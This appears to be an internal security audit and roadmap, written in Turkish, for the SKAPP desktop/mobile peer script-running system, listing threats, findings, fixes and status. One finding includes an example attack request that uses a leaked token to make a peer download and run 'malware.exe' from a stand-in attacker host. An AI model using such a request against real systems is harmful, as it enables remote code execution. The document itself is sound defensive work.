# SKAPP Güvenlik Audit'i ve Yol Haritası

Bu doküman, SKAPP Desktop ve mobil/peer SKAPP arasındaki iletişim yüzeyinin
güvenlik analizini, bulunan açıkları ve her açık için somut çözüm
adımlarını listeler. Önceliklendirme test fazından dış tester'a geçiş
öncesi kapatılması zorunlu olan kalemleri vurgular.

---

## 0. Tehdit modeli (kim, ne yapabilir)

| Aktör | Mevcut yetki | Hedef |
|---|---|---|
| Eşleşmemiş yabancı, aynı LAN | mDNS'ten Desktop varlığını ve UUID'sini görür; HTTP endpoint'lerini sondalayabilir | Bearer token olmadan 401 alır, çalıştıramaz |
| Eşleşmemiş yabancı, başka LAN | Erişimi yok | Erişimi yok |
| Eşleşmiş telefon (kullanıcının kendi cihazı) | Bearer token sahibi, tüm bundled script'leri parametreleriyle çalıştırabilir | Tasarım bu, ama parametre denetimi eksik |
| Eşleşmiş telefon, ele geçirilmiş | Token sızar, saldırgan eşleşmiş telefon gibi davranır | Eşleşmiş telefon yetkilerinin tamamı |
| Pasif WiFi sniffer | HTTP cleartext görünüyor | Token + payload yakalar, replay'leyebilir |
| Aktif LAN saldırganı | mDNS yayını sahteleyebilir, ARP spoof yapabilir | Telefonu sahte Desktop'a yönlendirebilir |

Sonuç: **Eşleşmemiş bir SKAPP, başka bir SKAPP'ı tetikleyemez** (Bearer
token zorunluluğu sayesinde). **Eşleşmiş bir peer ise tüm scriptleri
neredeyse sınırsız parametre özgürlüğüyle çalıştırabilir** ve token sızdığı
anda aynı yetkilere herhangi bir saldırgan kavuşur.

---

## 1. Mevcut savunmalar

Şu an çalışan koruma katmanları:

- **Bearer token zorunluluğu** ([skapp_http_server.dart:174-180](app/lib/core/network/skapp_http_server.dart#L174-L180))
  Her HTTP isteğinde `Authorization: Bearer <token>` aranır, eşleşmezse
  401. LAN'daki rastgele saldırgan endpoint çağıramaz.

- **ECDH eşleşme + HMAC challenge-response** (cihaz pairing tarafı,
  pairing_screen.dart). SKAPP-cihaz hattı zaten güçlü, audit kapsamı
  dışında.

- **Bundled script kaynak kontrolü**: script kaynağı çalışma anında
  okunup başka peer tarafından değiştirilemez. Override storage da yerel
  yazma, peer tarafından override edilemez.

---

## 2. Açıklar (öncelik sırası)

> **Denetim güncellemesi (2026-05-16):** Maddeler 1-10 için kod tarama sonuçları
> her başlığın altına `Durum:` satırı olarak eklendi. Faz B5 ve Faz C için
> yeni 9 madde "## 2b. Yeni bulgular (2026-05-16 denetimi)" altında.

### 🔴 KRİTİK 1 · Bearer token plaintext SharedPreferences'da saklanıyor

**Konum:** [`app/lib/core/system/network_identity_provider.dart:131`](app/lib/core/system/network_identity_provider.dart#L131)

```dart
await prefs.setString(_prefsKey, jsonEncode(id.toJson()));
```

Token 32 byte rastgele base64url, üretimde güçlü; sorun saklamada.
SharedPreferences düz XML/sqlite, OS şifrelemesi yoksa diskten okunabilir.

**Etki:** Cihaz yedeği, kötücül uygulama, fiziksel erişim → token sızar
→ saldırgan eşleşmiş peer gibi davranır → tüm scriptleri çalıştırır.

**Çözüm:** [`flutter_secure_storage`](https://pub.dev/packages/flutter_secure_storage) paketi ekle. Token'ı bu storage'a yaz:
- Android: AES (Keystore), API 23+
- iOS: Keychain
- Windows: DPAPI (CurrentUser kapsamı)
- macOS: Keychain
- Linux: libsecret (yoksa fallback)

Migration: ilk launch'ta SharedPreferences'taki eski token okunur,
secure storage'a yazılır, SharedPreferences'tan silinir.

**Durum (2026-05-16): ⚠️ KISMI.** `FlutterSecureStorage`'a taşındı, migration
([network_identity_provider.dart:133-157](app/lib/core/network/network_identity_provider.dart#L133-L157))
ve `..remove('bearerToken')` strip yolu doğru. Plaintext fallback yok. Tek
nokta: Linux'ta libsecret yoksa kalıcılık olmadığı için token RAM-only
yaşar (dokümante davranış).

---

### 🔴 KRİTİK 2 · Script whitelist yok, paired peer her bundled scripti çağırabilir

**Konum:** [`app/lib/core/network/skapp_http_server.dart:109-117`](app/lib/core/network/skapp_http_server.dart#L109-L117)

```dart
final manifest = await ref
    .read(scriptRepositoryProvider)
    .loadScript(platform, scriptId);
final result = await ref.read(scriptRunnerProvider).run(
      manifest,
      paramOverrides: paramOverrides,
      ...
    );
```

URL'de gelen `<scriptId>` direkt repository'den yükleniyor. Token sahibi
herhangi bir peer `shutdown`, `kill-app`, `lock`, `hibernate` gibi her
bundled scripti tetikleyebilir.

**Etki:** Token sızdığı anda saldırgan kullanıcının makinesini kapatabilir,
açık dosyaları kapatabilir, browser sekmelerini kapatabilir, vs.

**Çözüm (iki katmanlı):**

1. **Script-bazlı uzaktan-çalıştırılabilir bayrağı.** Manifest JSON'una
   `"remoteRunnable": true|false` alanı ekle (default false). HTTP
   endpoint manifest'i yükleyince bayrağı kontrol eder, false ise 403
   döner. Sadece kullanıcının açık olarak izin verdiği script'ler uzaktan
   çalışır.

2. **Kullanıcı onay dialog'u** (opsiyonel ek katman). Settings'te
   "Uzaktan çalıştırmaya her seferinde sor" toggle'ı. Açıksa, server
   isteği aldığında ana isolate'a mesaj atar; Desktop'ta modal "X cihaz
   `lock` çalıştırmak istiyor — İzin Ver / Reddet" gösterir, kullanıcı
   reddederse 403.

Faz: Kritik 1 ile birlikte bu kapatılmadan dış tester'a verilemez.

**Durum (2026-05-16): ✅ FIX.** Manifest field default `false`
([script_manifest.dart:22, 70, 90](app/lib/features/skapi/data/script_manifest.dart#L22)).
23 zararsız manifest opt-in; shutdown/kill-app/browser-close-all `false`
kalıp 403 `not_remote_runnable` dönüyor
([skapp_http_server.dart:299-316](app/lib/core/network/skapp_http_server.dart#L299-L316)).

---

### 🔴 KRİTİK 3 · Parameter injection — overrides doğrulanmadan script'e geçiyor

**Konum:** [`app/lib/features/skapi/data/param_merge.dart:26-70`](app/lib/features/skapi/data/param_merge.dart#L26-L70)

`paramOverrides` map'i manifest default'larının üstüne tip dönüşümü
dışında bir denetim olmadan biniyor. Örnek saldırı:

```http
POST /api/scripts/win/install-app/run
Authorization: Bearer <leaked-token>
Content-Type: application/json

{ "paramOverrides": { "AppUrl": "http://attacker.com/malware.exe" } }
```

PowerShell scriptleri `-ExecutionPolicy Bypass` ile çalıştığından
`Invoke-WebRequest`+`Start-Process` zinciriyle keyfi indirme + çalıştırma
mümkün hale gelir.

**Etki:** Eşleşmiş peer için **arbitrary code execution.** Kullanıcı admin
ise sistem ele geçirilir.

**Çözüm:** Manifest'teki her `ScriptParam`'ın `type` (string/int/bool/enum)
+ varsa `min/max/pattern/allowedValues` alanlarını HTTP server'da
override'lara uygula:

- Tip uyumsuz → 400
- Range dışı → 400
- Pattern eşleşmiyorsa → 400
- `allowedValues` varsa, override o listede değilse → 400

`ScriptParam` modeline gerekirse yeni alanlar eklenir (`pattern`,
`allowedValues`). Mevcut bundled scriptler için: URL alan parametreler
`pattern: "^https://[a-z0-9.-]+/.*"` gibi sıkı regex'lerle kısıtlanır
veya server tarafında `Uri.parse` + scheme whitelist (`https` only).

**Durum (2026-05-16): ✅ FIX.** `ParamValidator`
([param_merge.dart:50-219](app/lib/features/skapi/data/param_merge.dart#L50-L219))
unknown_param / type_mismatch / range_violation / not_allowed /
pattern_violation / invalid_chars (C0 kontrol byte yasağı, TAB/LF/CR muafiyetli).
Sunucu çağrısı ([skapp_http_server.dart:323-344](app/lib/core/network/skapp_http_server.dart#L323-L344)).
`script_runner` argv list + `runInShell: false` ile shell expansion yok.

---

### 🟠 YÜKSEK 4 · Replay protection yok

**Konum:** [`app/lib/core/network/skapp_http_server.dart:168-184`](app/lib/core/network/skapp_http_server.dart#L168-L184)

İstekte sadece statik bearer var. Nonce, timestamp, HMAC yok. WiFi'da
yakalanan tek bir istek defalarca tekrar gönderilebilir.

**Etki:** Pasif sniffer aktif saldırgana dönüşür; tek bir "lock"
çağrısını sürekli replay'leyerek cihazı kullanılmaz hale getirebilir.

**Çözüm:** HMAC-SHA256 ile request signing.

- Header: `Authorization: SKAPP-HMAC <uuid>:<timestamp>:<signature>`
- `signature = HMAC-SHA256(token, "${method}\n${path}\n${timestamp}\n${bodySha256}")`
- Server: `timestamp` şu andan ±300 saniye; aksi halde 401.
- Server: aynı `(uuid, timestamp, signature)` üçlüsü 5 dakika boyunca
  bir kere kabul edilir (in-memory LRU). İkinci görüşte 409.

Token hala paylaşılan secret, ama artık secret hat boyunca akmıyor;
sadece imzayı verifiye etmek için kullanılıyor.

**Durum (2026-05-16): ✅ FIX.** `SKAPP-HMAC <peerUuid>:<ms>:<sigHex>`
([hmac_signer.dart:83-200](app/lib/core/network/hmac_signer.dart#L83-L200)),
±300 sn skew, 256-slot nonce LRU, constant-time compare. Server entegrasyonu
([skapp_http_server.dart:729-758](app/lib/core/network/skapp_http_server.dart#L729-L758)).
**Not:** Bearer fallback kod yolu hâlâ açık → bkz. **Yeni Madde 13**.

---

### 🟠 YÜKSEK 5 · TLS yok, HTTP cleartext

**Konum:** [`app/lib/core/network/skapp_http_server.dart:51-55`](app/lib/core/network/skapp_http_server.dart#L51-L55)
ve [`app/lib/core/network/skapp_http_client.dart:31`](app/lib/core/network/skapp_http_client.dart#L31)

Token + tüm payload düz HTTP'de gidiyor. Bir kahve dükkanında ya da paylaşımlı evde packet capture ile yakalanabilir.

**Çözüm:** Self-signed TLS sertifikası.

- İlk launch'ta Desktop, kendi UUID'sine bağlı self-signed cert + key
  üretir, secure storage'a yazar.
- HTTP server `HttpServer.bindSecure` ile cert'i kullanır.
- Pairing payload'ına cert fingerprint (SHA-256) eklenir.
- HTTP client (peer telefon) cert pinning yapar: TLS handshake'te
  fingerprint eşleşmiyorsa bağlantıyı kapatır.

Self-signed yeterli: kullanıcı CA'larına güvenmiyoruz, sadece bilinen
fingerprint'e güveniyoruz. Bu pattern Tailscale, Syncthing gibi tipik
LAN-mesh ürünlerinde standart.

**Durum (2026-05-16): ✅ FIX.** RSA-2048 self-signed
([self_signed_cert.dart](app/lib/core/network/self_signed_cert.dart)),
server `bindSecure` ([skapp_http_server.dart:82-93](app/lib/core/network/skapp_http_server.dart#L82-L93)),
client SHA-256 pinning `badCertificateCallback`
([skapp_http_client.dart:62-80](app/lib/core/network/skapp_http_client.dart#L62-L80)).
Pairing payload + mDNS TXT fingerprint taşıyor.
**Not:** Disk fallback chmod best-effort → bkz. **Yeni Madde 15**.

---

### 🟡 ORTA 6 · Server `0.0.0.0` (tüm interface'ler) üzerine bind ediyor

**Konum:** [`app/lib/core/network/skapp_http_server.dart:51-55`](app/lib/core/network/skapp_http_server.dart#L51-L55)

```dart
await HttpServer.bind(InternetAddress.anyIPv4, port);
```

Localhost dahil tüm IPv4 interface'lerde dinliyor. Ev WiFi'sinde
genelde sorun değil, ama coffee shop / havalimanı gibi paylaşımlı
ağlarda saldırı yüzeyini açık ediyor.

**Çözüm:** Default localhost-only. Settings'te "Telefonumla eşleşmeye
izin ver" toggle'ı. Açıkken `anyIPv4`'e geçer, kapalı ise `loopbackIPv4`
(sadece local). Toggle değişiminde server restart, mevcut listener
restart pattern'ı zaten var.

**Durum (2026-05-16): ✅ FIX.** `lanVisible` toggle (default `true`)
[network_identity_provider.dart:191-196](app/lib/core/network/network_identity_provider.dart#L191-L196);
true → `anyIPv4`, false → `loopbackIPv4`
[skapp_http_server.dart:72-73](app/lib/core/network/skapp_http_server.dart#L72-L73).

---

### 🟡 ORTA 7 · QR pairing payload'ı bearer token taşıyor

**Konum:** [`app/lib/core/network/skapp_peer_target.dart:94-99`](app/lib/core/network/skapp_peer_target.dart#L94-L99)

QR ekrandayken telefonla fotoğraf çekilir, kameraya yansır, screencast'a
girerse token sızar. Token uzun ömürlü olduğundan tek sızıntı yeterli.

**Çözüm seçenekleri (artan güç):**

1. **One-time pairing token.** QR'a kalıcı bearer yerine 60 saniye
   geçerli bir handshake token koyulur. Telefon bu token'la pairing
   handshake yapar, server ECDH benzeri şifreli kanaldan kalıcı per-peer
   token verir. QR sızsa bile 60 saniye sonra ölü.

2. **Per-peer token.** Her eşleşmiş peer için ayrı token. Bir telefon
   ele geçirilirse sadece o peer'ın token'ı revoke edilir, diğerleri
   etkilenmez. Settings'te "Eşleşmiş cihazlar" listesi, her satır için
   "Eşleşmeyi kaldır" butonu.

3. **Cert pinning ile combine.** Madde 5 ile birlikte: token sızsa bile
   saldırgan başka cert kullanmadıkça bağlanamaz. İki katman.

Önerilen: 1 + 2 (one-time + per-peer) Faz B'de.

**Durum (2026-05-16): ✅ FIX.** 60 sn TTL handshake + tek kullanım
([pairing_handshake_provider.dart:35-95](app/lib/core/network/pairing_handshake_provider.dart#L35-L95)).
Per-peer 32-byte token + cascade revoke
([peer_tokens_provider.dart:118-192](app/lib/core/network/peer_tokens_provider.dart#L118-L192)).
Redeem endpoint ([skapp_http_server.dart:154-211](app/lib/core/network/skapp_http_server.dart#L154-L211)).

---

### 🟡 ORTA 8 · mDNS spoof'lanabilir, manual pairing UUID doğrulamıyor

**Konum:** [`app/lib/features/skapi/skapp_peer_pairing_screen.dart:232-254`](app/lib/features/skapi/skapp_peer_pairing_screen.dart#L232-L254)

mDNS yapısı gereği imzasız. Saldırgan kendi makinesinden sahte bir
`_skappdesktop._tcp.local` instance yayınlayıp kullanıcı manual
pairing'de IP/UUID girerken yanılmasını ümit edebilir.

**Çözüm:** Pairing flow'una UUID confirmation adımı.

- Desktop ekranında UUID'nin son 4 karakteri büyük punto ile gösterilir
  ("ABCD")
- Telefon manuel pairing'de bu 4 karakteri yazmadan butonu açmaz
- QR yolunda otomatik geçer, sadece manual yolda bu adım eklenir

Yan etki sıfır, kullanıcı UX'i 1 ekstra saniye, MITM zorluğu radikal
artar.

**Durum (2026-05-16): ✅ FIX.** Son 4 hex confirmation (case-insensitive,
dash strip) [skapp_peer_pairing_screen.dart:315-331](app/lib/features/skapi/skapp_peer_pairing_screen.dart#L315-L331).
Hata key'i `uuid_confirm` UI'da render ediliyor.

---

### 🟢 DÜŞÜK 9 · Rate limiting yok

DoS açısından düşük çünkü token zaten gerekli, ama brute-force ve
yanlışlıkla cihaz açma/kapama dalgası riski var.

**Çözüm:** Server middleware: peer UUID bazlı 5 run / dakika sınırı.
Aşılırsa 429. In-memory LRU sayaç yeterli, kalıcı kayıt gerekmez.

**Durum (2026-05-16): ⚠️ KISMI.** Per-peer eşzamanlı çalıştırma cap'i (3)
+ 429 `too_many_runs` var ([active_runs_registry.dart:10](app/lib/features/skapi/data/active_runs_registry.dart#L10)).
Dakika başına çağrı sınırı YOK — brute-force/burst koruması eksik.

---

### 🟢 DÜŞÜK 10 · Audit log yok

Hangi peer'ın hangi script'i ne zaman çağırdığı kayıtlı değil. Forensic
açısından açık.

**Çözüm:** Settings → "Diagnostic" altında "Uzaktan çalıştırma logu"
sekmesi. Her run için: timestamp, peer UUID + adı, script id, parametre
özeti, sonuç (ok / err). Yerel SQLite'da dairesel buffer (son 1000
kayıt). Peer ele geçirildi şüphesinde kullanıcı buradan kontrol eder.

**Durum (2026-05-16): ✅ FIX (kısıtlı kalıcılık).** 50-slot RAM ring buffer
([remote_run_activity_provider.dart:103-191](app/lib/features/skapi/data/remote_run_activity_provider.dart#L103-L191))
ve `webhook_activity_provider.dart` paralel kayıt. Override key'ler loglu,
değerler değil. SQLite kalıcı buffer yok — forensic için Faz C'de eklenmeli.

---

## 2b. Yeni bulgular (2026-05-16 denetimi)

Faz A + B1-B4 kapatıldıktan sonra yapılan taze taramada bulunan ek
açıklar. Dış tester ile public beta arasındaki "Faz B5" pencereye en
azından 11-13 kapatılmalı; Faz C kalemleri 14-19'a kaydırıldı.

### 🔴 KRİTİK 11 · `single_instance` loopback'i mesajı doğrulamadan focus tetikliyor

**Konum:** [`app/lib/core/desktop_lifecycle/single_instance.dart:194-215`](app/lib/core/desktop_lifecycle/single_instance.dart#L194-L215)

127.0.0.1:47861 dinleyen `ServerSocket` gelen HER TCP bağlantısında
`onFocus()` çağırıyor. Gönderilen `FOCUS\n` payload'u okunmuyor bile.

**Etki:** Aynı kullanıcı altındaki herhangi bir local process, hatta
bazı browser fetch+CORS sızıntıları, `connect(127.0.0.1:47861)` yapıp
SKAPP'i sürekli ön plana getirip kullanıcıyı taciz edebilir. DoS
düzeyinde rahatsızlık.

**Çözüm:** Connection'da ilk satırı `utf8.decoder.bind(socket).first`
ile oku, sabit magic (`SKAPP_FOCUS_v1\n`) değilse `socket.destroy()`.
Şifrelemeye gerek yok, sadece komut doğrulaması yeterli.

---

### 🟠 YÜKSEK 12 · HTTP body size limit yok (JSON bomb / OOM)

**Konum:** [`app/lib/core/network/skapp_http_server.dart:155, 248, 475, 578, 730`](app/lib/core/network/skapp_http_server.dart)

Her route `await req.readAsString()` çağırıyor; shelf default'unda boyut
limiti yok. Özellikle `/api/pair/redeem` ve `/api/events/incoming`
AUTH ÖNCESİ body okuyor.

**Etki:** Eşleşmiş peer (veya pair/redeem yolu üzerinden eşleşmemiş
saldırgan) GB'lik payload göndererek Desktop'u OOM'ye sokabilir.

**Çözüm:** Middleware'de `Content-Length` kontrolü + okuma sırasında
64 KB üst sınır. Param overrides + event body için fazlasıyla yeter.
Aşılırsa 413 `payload_too_large`.

---

### 🟠 YÜKSEK 13 · Bearer fallback HMAC yanında hâlâ aktif

**Konum:** [`app/lib/core/network/skapp_http_server.dart:760-769`](app/lib/core/network/skapp_http_server.dart#L760-L769)

Faz B step 4 yorumu "retire that fallback" diyor ama kod yolu açık.
Eski sızmış bearer token (Madde 1 öncesi yedek vb.) hâlâ kullanılabilir;
HMAC zorunluluğu yok.

**Etki:** HMAC + replay koruması (Madde 4) ve TLS pinning (Madde 5)
bypass edilebilir — saldırgan eski bearer'la 401 yerine 200 alır.

**Çözüm:** Bearer dalını sil; veya `developerModeProvider` gibi bir
flag arkasına al ve default kapalı bırak. Modern client zaten HMAC
gönderiyor ([skapp_http_client.dart:113-125](app/lib/core/network/skapp_http_client.dart#L113-L125)).

---

### 🟡 ORTA 14 · mDNS TXT version + UUID + platform sızdırıyor

**Konum:** [`app/lib/core/network/skapp_mdns_announcer.dart:81-88`](app/lib/core/network/skapp_mdns_announcer.dart#L81-L88)

`_skappdesktop._tcp.local` TXT kaydı `uuid`, `v` (sürüm), `os` taşıyor.
Misafir Wi-Fi'da aynı subnette herkes okur.

**Etki:** UUID kalıcı kimlik (token rotate edilse bile değişmiyor) →
device fingerprinting. Sürüm sızıntısı version-targeted CVE saldırısını
kolaylaştırır.

**Çözüm:** Announcer'ı `lanVisible` toggle'ına bağla (şu an sadece
`supported` bakıyor). Version + os field'larını default kapat, Developer
mode'da aç. UUID kaçınılmaz (servis ID'si olarak kullanılıyor).

---

### 🟡 ORTA 15 · scriptId / platform path traversal regex yok

**Konum:** [`app/lib/features/skapi/data/override_storage.dart:39-47`](app/lib/features/skapi/data/override_storage.dart#L39-L47)
+ [`script_repository.dart:51-61`](app/lib/features/skapi/data/script_repository.dart#L51-L61)

HTTP `/api/scripts/<platform>/<scriptId>/run` üzerinden gelen
`scriptId` string concat ile path'e gidiyor. Asset bundle traversal'ı
pratikte exception atar ama `OverrideStorage` `<appSupport>/skapi/overrides/<platform>/<scriptId>.ps1`
dosyası açabilir.

**Etki:** Eşleşmiş peer keyfi path'e dosya yaratma denemesi yapabilir
(uzak salt okunur read yok ama defense-in-depth ihlali).

**Çözüm:** Server endpoint'inde whitelist regex —
`scriptId: ^[a-z0-9-]+$`, `platform: ^(win|mac|lx|lx-debian|other)$`.
Bir satırlık değişiklik, savunma derinliği.

---

### 🟡 ORTA 16 · TLS cert disk fallback chmod best-effort

**Konum:** [`app/lib/core/network/self_signed_cert.dart:147-164`](app/lib/core/network/self_signed_cert.dart#L147-L164)

Linux'ta libsecret kapalıysa cert + key dosyaya yazılıyor; `chmod 600`
`Process.run('chmod', ...)` ile çağrılıyor ve hata try/catch'le yutuluyor.
FAT/exFAT veya chmod fail durumunda key world-readable kalabilir.

**Etki:** Çok kullanıcılı Linux makinesinde başka kullanıcı TLS özel
anahtarını okuyup MITM yapabilir.

**Çözüm:** Yazımdan sonra `File.statSync()` ile mode'u doğrula; başarısızsa
secure storage'a yazılamadığını UI'da bariz uyarı olarak göster ve cert
üretmeyi reddet (TLS'siz çalışmayı engelle).

---

### 🟡 ORTA 17 · BF firmware passphrase verify `ts_unix` doğrulaması devre dışı

**Konum:** [`esp32/BF/components/sk_core/src/sk_auth_hmac.c:79-86`](esp32/BF/components/sk_core/src/sk_auth_hmac.c#L79-L86)

`sk_auth_verify_message` `TS_WINDOW_SEC = 60` hesaplamış ama
`(void)ts_unix` ile yok sayıyor. Yorum "SNTP yok, nonce taşıyor" diyor.
Cihaz reboot sonrası `sk_auth_replay_reset` nonce ringi sıfırlanırsa
eski capture'lar bir kez daha geçer.

**Etki:** Pasif sniffer cihaz reboot'unu bekleyip yakaladığı tek imzayı
replay'leyebilir (yalnızca yeniden eşleşme yapılırsa nonce ringi sıfırlanır).

**Çözüm:** SKAPP zaten `time.set` push ediyor (BF webhook root-cause
fix'iyle birlikte gelmişti). Firmware'de push sonrası ts_unix doğrulamayı
aç; SNTP olmadan sadece SKAPP set'inden gelen monotonic baseline'ı kullan.

---

### 🟢 DÜŞÜK 18 · Webhook HMAC canonical mesajı length prefix taşımıyor

**Konum:** [`app/lib/core/network/webhook_receiver.dart:126`](app/lib/core/network/webhook_receiver.dart#L126)

`'$body\n$tsStr\n$nonceHex'` formatı kanonik değil; body içinde gömülü
`\n<ts>\n<nonce>` yapısı varsa teorik kanonikleşme çakışması.

**Etki:** Pratikte sıfır (body JSON, `\n` her zaman `\\n` escape'li). Sadece
güvenlik temizliği.

**Çözüm:** Input'u `"%zu\n%s\n%lld\n%s"` gibi length-prefixed formata çevir.
Cihaz ve SKAPP tarafını birlikte güncelle.

---

### 🟢 DÜŞÜK 19 · `stringList` parametre virgül delimit injection

**Konum:** [`app/lib/features/skapi/data/param_merge.dart:271`](app/lib/features/skapi/data/param_merge.dart#L271)

`stringList` tipi öğeleri `value.join(',')` ile birleşip tek argv token'ı
olarak gönderiliyor. PowerShell scripti virgülle split ediyorsa, kullanıcı
string'in içinde virgül enjekte ederek listeye fazladan eleman ekleyebilir.

**Etki:** Şu an `stringList` kullanan opt-in remoteRunnable script yok,
risk teorik. İleride list parametreli bir script eklenirse açılır.

**Çözüm:** `stringList` öğelerini virgül delimit yerine ayrı argv token
olarak gönder; her öğe için ayrıca pattern validation uygulanır.

---

## 3. Yol haritası

### Faz A — dış tester öncesi zorunlu (1-2 gün)

- [ ] **Açık 1**: Token'ı `flutter_secure_storage`'a taşı + migration
- [ ] **Açık 2**: Manifest'e `remoteRunnable` bayrağı + server kontrolü
- [ ] **Açık 3**: Param override schema validation (tip + pattern + allowed)
- [ ] **Açık 6**: Default localhost-only + Settings toggle

Dış tester'a verilebilir minimum: Faz A. Bu noktada eşleşmiş bile olsa
saldırgan whitelist dışına çıkamaz, parametreyi maniple edemez,
Settings'ten kapatılabilir.

### Faz B — public beta öncesi zorunlu (3-5 gün)

- [ ] **Açık 4**: HMAC-SHA256 request signing + replay window
- [ ] **Açık 5**: Self-signed TLS + cert pinning
- [ ] **Açık 7**: One-time pairing token + per-peer kalıcı token
- [ ] **Açık 8**: Manual pairing'de UUID confirmation adımı

Bu noktada cleartext sniffer, replay, mDNS spoof ve QR sızıntısı
azaltılmış olur.

**Durum (2026-05-16):** Faz B1-B4 tamam (TLS pinning dahil).

### Faz B5 — public beta öncesi zorunlu (1 gün) [yeni, 2026-05-16]

Dış tester ile public beta arasında kapatılması gereken yeni bulgular:

- [ ] **Açık 11**: `single_instance` loopback message gate (magic string)
- [ ] **Açık 12**: HTTP body size limit (64 KB) middleware
- [ ] **Açık 13**: Bearer fallback'i HMAC zorunluluğuna çevir
- [ ] **Açık 15**: scriptId + platform whitelist regex
- [ ] **Açık 9 (tamamla)**: Per-peer dakika sınırı (5/dk → 429)

### Faz C — production (sürekli)

- [ ] **Açık 10 (kalıcılık)**: Audit log SQLite ring buffer (1000 kayıt)
- [ ] **Açık 14**: mDNS TXT version/os field'larını lanVisible'a bağla
- [ ] **Açık 16**: TLS cert chmod sonrası `statSync` doğrulaması
- [ ] **Açık 17**: BF firmware `time.set` sonrası ts_unix doğrula
- [ ] **Açık 18**: Webhook HMAC canonical mesajına length prefix
- [ ] **Açık 19**: `stringList` argv ayrı token + per-item pattern
- [ ] Pen test (3. parti veya kendi kapsamımızda)
- [ ] Token rotation mekanizması (kullanıcı manuel "yeni token")

---

## 4. Kapsam dışı

Bu audit'in kapsamadıkları (ayrı incelemeler):

- **SKAPP ↔ ESP32 cihaz hattı** (BLE pairing + ECDH + HMAC). Daha önce
  tasarlandı, mevcut kod güçlü görünüyor; ayrı doküman gerekirse.
- **OTA update kanalları**. Faz K'da inecek, ayrı tehdit modeli olacak.
- **Cloud bağlantısı** yok, kapsam dışı; eklenirse ayrı audit gerekir.
- **Side-channel saldırılar** (RAM dump, Spectre, vb.) ürün kapsamında
  değil.

## 4b. Public repo modu (2026-05-16 eklendi)

SKAPP repo'sunun GitHub public yayımlanması düşünülüyor. Bu, **tehdit
modeline yeni bir kalem eklemiyor**, çünkü tasarım Kerckhoffs uyumlu:

> Bir kriptografik sistem, algoritması ve uygulaması düşmanca biliniyor
> olsa bile güvenli kalmalı; güvenlik sadece anahtar materyalinde olmalı.

SKAPP'in tüm anahtar materyali **runtime'da üretilir veya secure storage'da
durur**, kodda hiç sır yoktur:

- Bearer token + per-peer token: `FlutterSecureStorage`, kod public olsa
  bile bu değerler kullanıcı cihazlarında özeldir
- TLS self-signed cert + key: per-install runtime üretilir
  ([self_signed_cert.dart](app/lib/core/network/self_signed_cert.dart))
- ECDH ephemeral key'ler: BLE pairing anında üretilir, hiçbir yerde
  saklanmaz
- HMAC bond key'leri: pairing'de random'dan türetilir, sadece bonded
  cihazda ve SKAPP secure storage'ında

Saldırgan public kodu okuduğunda öğrendikleri (protokol formatı, ECDH eğrisi
seçimi, HMAC envelope yapısı) zaten standart pratik; sömürülebilir yeni
bir avantaj sağlamaz. Mevcut Faz A + B savunmalarına ek yapılması gereken
şey yoktur. Public push öncesi tek defalık checklist
[project_repo_hardening](#) memory'sindedir.

---

## 5. Hızlı eylem kontrol listesi

Faz A için tahmini efor: 1-2 günlük tek geliştirici işi.

1. `flutter_secure_storage` ekle, `network_identity_provider`'da token'ı taşı, migration yaz, eski key'i sil
2. `ScriptManifest`'e `remoteRunnable` field ekle, manifest JSON'larında zararsız scriptlere true ver, tehlikelilere false; HTTP server endpoint'inde flag kontrolü
3. `param_merge.dart`'ı doğrulama yapan bir wrapper'la sar; `ScriptParam`'a gerekirse `pattern` ekle; bundled scriptlerde URL parametrelerine `^https://` regex'i koy
4. Settings'e "LAN'da görünür ol" toggle ekle, default kapalı, server bind'ı toggle'a göre değişsin

Sonrasında release build + 2x kontrol, dış tester'a güvenle verilir.
